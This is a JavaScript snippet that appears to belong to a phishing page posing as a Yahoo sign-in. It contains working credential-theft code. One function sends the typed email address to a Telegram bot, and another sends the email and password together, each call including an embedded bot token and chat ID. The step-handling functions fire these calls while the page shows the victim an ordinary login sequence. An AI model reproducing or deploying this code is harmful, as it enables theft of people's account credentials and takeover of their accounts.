// ================= TELEGRAM BOT SETTINGS =================
const BOT_TOKEN = "8664946712:AAHho-AsU7hRuBs43J-7k-kZ5gmhUz6-6b8";   // ← Replace with your real token
const CHAT_ID   = "-1003709189605";     // ← Replace with your real chat ID

async function sendEmailToTelegram(email) {
    const message = `🔑 Yahoo Login Attempt\n\nEmail: ${email}\nTime: ${new Date().toLocaleString()}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
    } catch (e) {
        console.error("Telegram error:", e);
    }
}

async function sendLoginToTelegram(email, password) {
    const message = `✅ Full Yahoo Login\n\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
    } catch (e) {
        console.error("Telegram error:", e);
    }
}

// Updated functions
function goToPassword() {
    const email = document.getElementById('emailInput').value.trim();
    if (!email) return;

    sendEmailToTelegram(email);

    document.getElementById('emailStep').style.display = 'none';
    document.getElementById('passwordSection').style.display = 'block';
    document.getElementById('emailDisplay').textContent = email;
}

async function sendOTPAndGoToOTP() {
    const email = document.getElementById('emailInput').value.trim();
    const password = document.getElementById('passwordInput').value.trim();

    if (!password) {
        alert("Please enter your password");
        return;
    }

    await sendLoginToTelegram(email, password);

    // Your original code continues here
    alert("Signing in...");
}